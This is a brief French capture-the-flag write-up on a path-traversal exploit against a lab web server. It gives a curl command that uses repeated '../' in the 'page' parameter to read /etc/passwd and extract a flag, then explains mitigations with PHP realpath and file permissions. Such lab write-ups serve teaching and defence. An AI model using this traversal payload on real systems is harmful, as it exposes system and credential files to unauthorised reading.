# Exploit 09 - relative path

Sur le site web, le routage est géré par le paramètre de requête _page_. Nous pouvons essayer d'insérer des chemins
relatifs vers les répertoires parents pour trouver des fichiers de configuration sur le serveur.

```bash
curl -s -X GET "http://192.168.56.102/index.php?page=../../../../../../../../../etc/passwd" | grep -oP 'The flag is : \K[0-9a-f]{64}'
```

Pour contrer cette attaque, il faut vérifier que le chemin demandé ne contient pas de séquence `../` et qu'il est bien
situé dans le répertoire de contenu. Pour cela, on peut utiliser la fonction `realpath` de PHP, qui résoudra les
liens symboliques et les séquences `../` pour nous. 

Aussi une bonne gestion des permissions sur les fichiers et répertoires est nécessaire pour éviter que l'attaquant
puisse lire des fichiers sensibles.